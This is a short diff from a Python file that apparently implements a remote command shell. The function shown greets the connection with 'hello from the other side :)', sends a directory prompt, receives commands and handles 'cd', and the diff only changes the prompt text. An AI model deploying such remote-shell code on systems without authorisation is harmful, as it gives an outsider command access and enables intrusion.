@@ -77,7 +77,7 @@ def to_str(s):
 def easy_cmd(conn):
     conn.send_data(to_bytes('hello from the other side :)\n'))
     while 1:
-        conn.send_data(to_bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# ')))
+        conn.send_data(to_bytes(str('[Honigkuchenpferd ' + os.getcwd() + '] ')))
         cmd = to_str(conn.recive_data())
         if cmd.startswith('cd'):
             easy_chdir(cmd[3:len(cmd) - 1])
